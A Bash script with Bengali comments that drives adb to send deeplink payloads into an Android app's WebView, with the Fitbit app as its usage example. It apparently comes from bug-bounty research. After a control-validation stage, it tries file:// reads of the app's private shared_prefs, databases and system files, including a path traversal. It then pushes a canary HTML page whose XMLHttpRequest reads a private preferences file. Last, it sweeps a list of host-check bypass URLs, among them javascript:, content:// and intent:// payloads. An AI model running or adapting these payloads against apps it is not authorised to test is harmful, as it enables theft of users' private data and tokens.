#!/usr/bin/env bash
# mvrp-screen.sh — deeplink/WebView payload sweep.
#
# দুটো oracle, দুটোই যাচাইযোগ্য:
#   ১. topResumedActivity — app-এর কোনো activity উপরে এল কিনা। এটাই
#      "deeplink গ্রহণ হয়েছে" প্রশ্নের সরাসরি উত্তর, অস্পষ্টতা নেই।
#   ২. uiautomator dump — পর্দায় আসলে কী লেখা। ডিরেক্টরি তালিকা, net::ERR,
#      canary-র ফল; গ্রাফিক্স লগের কোলাহল এতে নেই।
#
# ইতিহাস (কেন এত control):
#   mvrp-payload.sh logcat-এ 'WebFrameActivity' খুঁজত। BufferQueueProducer
#   প্রতিবার activity খোলা/বন্ধ হলেই ওই নাম লেখে, তাই accept আর reject
#   দুটোই একই রায় পেয়েছিল। অষ্টম যন্ত্র-ত্রুটি, তৃতীয়বার একই প্রজাতির:
#   কোলাহল থেকে আত্মবিশ্বাসী রায়।
#
#   প্রথম সংস্করণে control ছিল, কিন্তু যথেষ্ট ছিল না: REJECT-CTL যদি
#   launcher পর্দা দেয়, সেটা "app প্রত্যাখ্যান করেছে" হতেও পারে, "app
#   সময়ে খোলেনি" হতেও পারে। একবারের মাপে তফাত করা যায় না। তাই এখন
#   প্রতিটা control REPS বার চলে আর ফল স্থির না হলে রান বাতিল।
#
# ব্যবহার:
#   ./mvrp-screen.sh 'fitbit://webview?url=' com.fitbit.FitbitMobile
#   REPS=3 WAIT=10 ./mvrp-screen.sh '<prefix>' <pkg>
#   ACCEPT_URL='https://m.app.example/' ./mvrp-screen.sh '<prefix>' <pkg>
set -uo pipefail

BASE="${1:?ব্যবহার: $0 '<deeplink-prefix-ending-in=>' <package>}"
PKG="${2:?package লাগবে}"
OUT="${MVRP_OUT:-$HOME/mvrp}"
REP="$OUT/screen/$(date +%Y%m%d-%H%M)"; mkdir -p "$REP"
LOG="$REP/report.txt"
WAIT="${WAIT:-8}"
REPS="${REPS:-2}"
PRIV="/data/data/$PKG"

case "$PKG" in
  *fitbit*)  ACCEPT_URL="${ACCEPT_URL:-https://www.fitbit.com/}" ;;
  *)         ACCEPT_URL="${ACCEPT_URL:-https://www.google.com/}" ;;
esac
REJECT_URL="${REJECT_URL:-https://example.org/}"

command -v adb >/dev/null || { echo "!! adb নেই"; exit 1; }
adb get-state >/dev/null 2>&1 || { echo "!! device connected নয়"; exit 1; }

adb shell svc power stayon usb >/dev/null 2>&1 </dev/null
adb shell input keyevent KEYCODE_WAKEUP >/dev/null 2>&1 </dev/null

enc() { printf '%s' "$1" | sed 's|%|%25|g; s|:|%3A|g; s|/|%2F|g; s|?|%3F|g; s|&|%26|g; s|#|%23|g; s|=|%3D|g; s| |%20|g'; }
# পর্দার পরিচয় থেকে অস্থির লেখা বাদ দিতে সব অঙ্ক মাস্ক করা হয়: ঘড়ি,
# ব্যাটারি, তাপমাত্রা, তারিখ, বাতাসের গতি।
#
# কেন: প্রথম Fitbit রানে launcher-এর চারটে স্ন্যাপশট চারটে আলাদা fingerprint
# পেয়েছিল, পার্থক্য ছিল শুধু "12:37 AM" বনাম "12:39 AM"। STAGE 3-এর payload
# গুলো ক্রমে চলে, তাই দলগুলো দাঁড়িয়েছিল মিনিট ধরে — আর আমি সেটা পড়েছিলাম
# "host www.fitbit.com দিয়ে শুরু হলে গ্রহণ" বলে, কারণ অ্যারেতে ঠিক ওই ছয়টাই
# আগে ছিল। সময়কে কারণ ভেবে নেওয়া। অঙ্ক মাস্ক করলে ঐ দরজা বন্ধ।
sig() { tr '0-9' '#' <<<"$1" | sha1sum | cut -c1-12; }

screen_text() {
  local x
  x=$(adb exec-out uiautomator dump /dev/tty 2>/dev/null </dev/null | tr -d '\r')
  if ! grep -q '<hierarchy' <<<"$x"; then
    adb shell uiautomator dump /sdcard/mvrp-dump.xml >/dev/null 2>&1 </dev/null
    x=$(adb shell cat /sdcard/mvrp-dump.xml 2>/dev/null </dev/null | tr -d '\r')
  fi
  grep -q '<hierarchy' <<<"$x" || { echo "__DUMP_FAILED__"; return; }
  grep -oE '(text|content-desc)="[^"]*"' <<<"$x" \
    | sed 's/^[a-z-]*="//; s/"$//' | grep -v '^$' | sort -u
}
top_act() {
  adb shell dumpsys activity activities 2>/dev/null </dev/null | tr -d '\r' \
    | grep -oE '(topResumedActivity|mResumedActivity)[^\n]*\{[^}]*\}' | head -1 \
    | sed 's/.* u0 //; s/ t[0-9]*}//; s/}$//'
}
# গ্রহণ/প্রত্যাখ্যান: কার activity উপরে এল। screen-text নয় — এটা দ্বিধাহীন।
acc() {
  case "$1" in
    *"$PKG"*)                 echo APP_OPENED ;;
    *[Ll]auncher*|"")         echo DROPPED ;;
    *)                        echo "OTHER_APP" ;;
  esac
}

# ---------- fire: সব ফল global-এ, কারণ $(...) subshell array হারিয়ে ফেলে ----------
N=0; FTEXT=""; FSIG=""; FACT=""; FACC=""; FFILE=""; FSTART=""; STABLE=1
SIG_L=(); URL_L=(); ACT_L=(); FILE_L=(); LBL_L=()
fire() {
  local url="$1" name="$2"
  N=$((N+1)); FFILE=$(printf '%02d-%s' "$N" "$name")
  adb shell am force-stop "$PKG" >/dev/null 2>&1 </dev/null
  adb shell input keyevent KEYCODE_HOME >/dev/null 2>&1 </dev/null
  sleep 1
  adb logcat -c >/dev/null 2>&1 </dev/null
  # am start-এর নিজের কথা রাখা হয়: "Error: Activity not started" মানে intent
  # পৌঁছায়ইনি, আর "app খুলে সাথে সাথে বন্ধ করেছে" মানে app প্রত্যাখ্যান
  # করেছে। দুটো সম্পূর্ণ ভিন্ন ঘটনা, অথচ দুটোতেই পর্দায় launcher থাকে।
  FSTART=$(adb shell am start -a android.intent.action.VIEW -d "'$BASE$(enc "$url")'" \
    2>&1 </dev/null | tr -d '\r' | grep -iE 'Error|Warning|Activity not started|Starting' | head -3)
  sleep "$WAIT"
  FTEXT=$(screen_text); FSIG=$(sig "$FTEXT")
  FACT=$(top_act);      FACC=$(acc "$FACT")
  case "$FSTART" in *[Ee]rror*|*"not started"*) FACC="INTENT_ERROR" ;; esac
  printf '%s\n' "$FTEXT" > "$REP/$FFILE.txt"
  { printf '%s\n' "$FACT"; printf 'am: %s\n' "$FSTART"; } > "$REP/$FFILE.act"
  adb logcat -d 2>/dev/null </dev/null \
    | grep -iE 'Cannot load|net::ERR|chromium.*CONSOLE|shouldOverrideUrl' \
    | head -6 > "$REP/$FFILE.logcat" 2>/dev/null
  SIG_L+=("$FSIG"); URL_L+=("$url"); ACT_L+=("$FACT"); FILE_L+=("$FFILE"); LBL_L+=("$name")
}
# একই URL REPS বার — sig স্থির না হলে ওই মাপটা অবিশ্বাস্য
fire_stable() {
  local url="$1" name="$2" i s0=""
  for ((i=1;i<=REPS;i++)); do
    fire "$url" "$name"
    [ -z "$s0" ] && s0="$FSIG"
    if [ "$FSIG" != "$s0" ]; then STABLE=0; return; fi
  done
  STABLE=1
}

classify() {
  local t="$1"
  if   [ "$t" = "__DUMP_FAILED__" ];                      then echo DUMP_FAILED
  elif grep -q 'MVRPREAD-OK' <<<"$t";                     then echo CANARY_READ_PRIVATE
  elif grep -q 'MVRPREAD-FAIL\|MVRPREAD-EX' <<<"$t";      then echo CANARY_READ_BLOCKED
  elif grep -q 'MVRP-CANARY' <<<"$t";                     then echo CANARY_RENDERED
  elif grep -qE '^[A-Za-z0-9_.-]+\.(xml|db|db-journal|json)$' <<<"$t"; then echo FILE_LISTING
  elif grep -qE 'Index of|/data/data/' <<<"$t";           then echo PATH_ON_SCREEN
  elif grep -oE 'net::ERR_[A-Z_]+' <<<"$t" | head -1 | grep -q .; then
       echo "$(grep -oE 'net::ERR_[A-Z_]+' <<<"$t" | head -1)"
  elif grep -qiE 'Webpage not available|cannot be loaded|Can.t open this page' <<<"$t"; then echo LOAD_REFUSED
  else echo "SCREEN"
  fi
}
row() { printf '%-11s %-22s %-13s %s\n' "$1" "$2" "$3" "$4"; }

{
echo "# mvrp-screen — oracle: topResumedActivity + uiautomator dump"
echo "# base    : $BASE"
echo "# pkg     : $PKG"
echo "# when    : $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "# device  : $(adb shell getprop ro.product.model 2>/dev/null | tr -d '\r') / Android $(adb shell getprop ro.build.version.release 2>/dev/null | tr -d '\r')"
echo "# ip      : $(curl -s --max-time 5 ifconfig.me 2>/dev/null || echo n/a)"
echo "# wait=$WAIT  reps=$REPS  dumps=$REP/"
echo

# ================= STAGE 0 =================
echo "===== STAGE 0 — যন্ত্র-বৈধতা (প্রতিটা control $REPS বার) ====="
adb shell am force-stop "$PKG" >/dev/null 2>&1 </dev/null
adb shell input keyevent KEYCODE_HOME >/dev/null 2>&1 </dev/null; sleep 2
H0T=$(screen_text); H0=$(sig "$H0T"); printf '%s\n' "$H0T" > "$REP/00-home.txt"
row "HOME" "$H0" "$(acc "$(top_act)")" "(বেসলাইন, $(wc -l <<<"$H0T") লাইন)"

fire_stable "$ACCEPT_URL" accept-ctl
H1="$FSIG"; A1T="$FTEXT"; A1ACC="$FACC"; A1STABLE="$STABLE"
row "ACCEPT-CTL" "$H1" "$A1ACC" "$(classify "$A1T")   $ACCEPT_URL"
echo "            activity: $FACT   stable=$A1STABLE"

fire_stable "$REJECT_URL" reject-ctl
H2="$FSIG"; R2T="$FTEXT"; R2ACC="$FACC"; R2STABLE="$STABLE"
row "REJECT-CTL" "$H2" "$R2ACC" "$(classify "$R2T")   $REJECT_URL"
echo "            activity: $FACT   stable=$R2STABLE"
echo

FAIL=0
[ "$A1T" = "__DUMP_FAILED__" ] && { echo "!! BROKEN: uiautomator dump কাজ করছে না (পর্দা লক?)"; FAIL=1; }
[ "$A1STABLE" -eq 0 ] && { echo "!! UNSTABLE: ACCEPT-CTL দুবার ভিন্ন পর্দা দিয়েছে — WAIT বাড়াও (WAIT=14)"; FAIL=1; }
[ "$R2STABLE" -eq 0 ] && { echo "!! UNSTABLE: REJECT-CTL দুবার ভিন্ন পর্দা দিয়েছে — WAIT বাড়াও (WAIT=14)"; FAIL=1; }
if [ "$A1ACC" != "APP_OPENED" ]; then
  echo "!! BROKEN: জানা-গ্রহণযোগ্য URL-এও app-এর activity উপরে আসেনি ($A1ACC)।"
  echo "   deeplink রুট করছে কিনা দেখো:"
  echo "   adb shell dumpsys package $PKG | grep -B2 -A6 'android.intent.action.VIEW'"
  FAIL=1
fi
if [ "$A1ACC" = "$R2ACC" ] && [ "$H1" = "$H2" ]; then
  echo "!! NOT DISCRIMINATING: accept আর reject একই activity + একই পর্দা।"
  FAIL=1
fi
if [ "$FAIL" -eq 1 ]; then
  echo; echo "===== থামলাম। যন্ত্র বৈধ নয়, কোনো payload চালানো হয়নি। ====="
  echo "ফল: অনিষ্পন্ন (inconclusive), নেতিবাচক নয়। নথিতে এটাই লেখো।"
  exit 2
fi
echo "VALIDATED  accept=$A1ACC/$H1   reject=$R2ACC/$H2   দুটোই $REPS বার স্থির।"
echo

# ================= STAGE 1 =================
echo "===== STAGE 1 — file:// দিয়ে app-এর ব্যক্তিগত ডিরেক্টরি ====="
PREFS=(); SRCD="$OUT/src/$PKG/sources"
if [ -d "$SRCD" ]; then
  mapfile -t PREFS < <(grep -rhoE 'getSharedPreferences\("[^"]+"' "$SRCD" 2>/dev/null \
    | sed 's/.*("//; s/"$//' | sort -u | head -6)
  echo "# সোর্স থেকে পাওয়া prefs নাম: ${PREFS[*]:-(কিছু নেই)}"
else
  echo "# সোর্স নেই ($SRCD) — ফাইলনাম অনুমান করা হচ্ছে, তাই এই ধাপ দুর্বল।"
  echo "#   আগে চালাও: jadx -d $OUT/src/$PKG $OUT/apk/$PKG/base.apk"
fi
S1=( "file://$PRIV/shared_prefs/" "file://$PRIV/databases/" "file://$PRIV/files/"
     "file:///android_asset/../../../..$PRIV/shared_prefs/"
     "file:///proc/self/cmdline" "file:///etc/hosts" )
for p in "${PREFS[@]}"; do [ -n "$p" ] && S1+=( "file://$PRIV/shared_prefs/$p.xml" ); done
for p in "${S1[@]}"; do
  fire "$p" s1
  row "$FACC" "$FSIG" "$(classify "$FTEXT")" "$p"
  case "$(classify "$FTEXT")" in
    FILE_LISTING|PATH_ON_SCREEN) grep -E '\.(xml|db|json)$' <<<"$FTEXT" | head -6 | sed 's/^/              /' ;;
  esac
done
echo

# ================= STAGE 2 =================
echo "===== STAGE 2 — file:// থেকে file:// (universal file access) ====="
TARGET="$PRIV/shared_prefs/"
[ "${#PREFS[@]}" -gt 0 ] && [ -n "${PREFS[0]:-}" ] && TARGET="$PRIV/shared_prefs/${PREFS[0]}.xml"
CAN=$(mktemp /tmp/mvrp-canary-XXXX.html)
cat > "$CAN" <<HTML
<html><body><h1>MVRP-CANARY</h1><div id="o">MVRPREAD-INIT</div>
<script>
var t="file://$TARGET";
function s(m){document.getElementById("o").textContent=m;document.title=m;}
try{
  var x=new XMLHttpRequest();
  x.onload=function(){s("MVRPREAD-OK "+String(x.responseText).substring(0,160));};
  x.onerror=function(){s("MVRPREAD-FAIL onerror");};
  x.open("GET",t); x.send();
}catch(e){ s("MVRPREAD-EX "+e); }
</script></body></html>
HTML
adb push "$CAN" /sdcard/mvrp-canary.html >/dev/null 2>&1 </dev/null \
  && echo "# canary পাঠানো হয়েছে, লক্ষ্য: $TARGET" || echo "!! canary push ব্যর্থ"
fire "file:///sdcard/mvrp-canary.html" canary
V=$(classify "$FTEXT")
row "$FACC" "$FSIG" "$V" "file:///sdcard/mvrp-canary.html"
grep -i 'MVRPREAD' <<<"$FTEXT" | head -3 | sed 's/^/              /'
case "$V" in
  CANARY_READ_PRIVATE) echo "              *** বাইরের একটা HTML app-এর ব্যক্তিগত ফাইল পড়েছে।" ;;
  CANARY_RENDERED|CANARY_READ_BLOCKED) echo "              (canary রেন্ডার হয়েছে, তাই FAIL সত্যিই ব্লকড — যন্ত্র-ত্রুটি নয়)" ;;
  *) echo "              (canary রেন্ডারই হয়নি -> file:// বন্ধ। এই ধাপ অনিষ্পন্ন।)" ;;
esac
rm -f "$CAN"
echo

# ================= STAGE 3 =================
echo "===== STAGE 3 — host-যাচাই বাইপাস ====="
H=$(sed 's|^https\?://||; s|/.*||' <<<"$ACCEPT_URL")
S3=( "https://$H.evil.example/" "https://evil$H/" "https://$H@example.org/"
     "https://$H%2f@example.org/" "https://$H../" "https://$H.example.org/"
     "https://example.org/?x=https://$H/" "https://example.org/#$H"
     "//example.org/" "https:/\\example.org/" "https://example.org\\@$H/"
     "javascript:document.title='MVRP-JS'"
     "content://$PKG.fileprovider/root/sdcard/mvrp-canary.html"
     "intent://x/#Intent;scheme=http;package=$PKG;end" )
for p in "${S3[@]}"; do
  fire "$p" s3
  tag=""
  [ "$FSIG" = "$H1" ] && tag="  <= ACCEPT-CTL পর্দার সমান"
  [ "$FSIG" = "$H2" ] && tag="  (= REJECT-CTL)"
  grep -q 'MVRP-JS' <<<"$FTEXT" && tag="  <= javascript: চলেছে"
  row "$FACC" "$FSIG" "$(classify "$FTEXT")" "$p$tag"
done
echo

# ================= পর্দার শ্রেণি =================
# এই টেবিলটাই গতবার ছিল না, আর সেটাই আমাকে অন্ধ করে রেখেছিল: পাঁচটা
# আলাদা sig পেয়েছিলাম কিন্তু কোনটায় কী লেখা তা জানার উপায় ছিল না।
echo "===== পর্দার শ্রেণি — প্রতিটা আলাদা পর্দা একবার করে ====="
for s in $(printf '%s\n' "${SIG_L[@]}" | sort -u); do
  for i in "${!SIG_L[@]}"; do
    if [ "${SIG_L[$i]}" = "$s" ]; then
      echo "--- sig=$s   activity=${ACT_L[$i]}   (sig-এ অঙ্ক মাস্ক করা, ঘড়ি গোনা হয় না)"
      sed -n '1,5p' "$REP/${FILE_L[$i]}.txt" | sed 's/^/      | /'
      [ -s "$REP/${FILE_L[$i]}.logcat" ] && sed -n '1,3p' "$REP/${FILE_L[$i]}.logcat" | sed 's/^/      LOG /'
      break
    fi
  done
  for i in "${!SIG_L[@]}"; do
    [ "${SIG_L[$i]}" = "$s" ] && echo "        <- ${URL_L[$i]}"
  done
  echo
done

cat <<'NOTE'
===== পড়ার নিয়ম =====
প্রথম কলাম = কার activity উপরে এল। APP_OPENED মানে app ওই URL-টা গ্রহণ
করেছে; DROPPED মানে deeplink হাতেই নেয়নি। এটাই গ্রহণ/প্রত্যাখ্যানের মাপ।

APP_OPENED + বাইরের host  ->  host-যাচাই বাইপাস। পরের প্রশ্ন একটাই:
                              ওই WebView-এ JS bridge বা token যায় কি?
CANARY_READ_PRIVATE       ->  বাইরের HTML app-এর ব্যক্তিগত ফাইল পড়েছে।
                              token থাকলে Theft of Sensitive Data।
FILE_LISTING              ->  precondition, crossing নয় (CLAUDE.md 2.6)।
net::ERR_*                ->  URL নেটওয়ার্ক স্ট্যাকে পৌঁছেছে তারপর ব্যর্থ —
                              অর্থাৎ app গ্রহণ করেছিল। এটা সংকেত, ব্যর্থতা নয়।
DROPPED সবখানে            ->  অনিষ্পন্ন নয়, এটাই নেতিবাচক ফল: যাচাই কাজ করছে।
NOTE
} 2>&1 | tee "$LOG"

echo
echo "রিপোর্ট: $LOG"
echo "সব dump: $REP/"
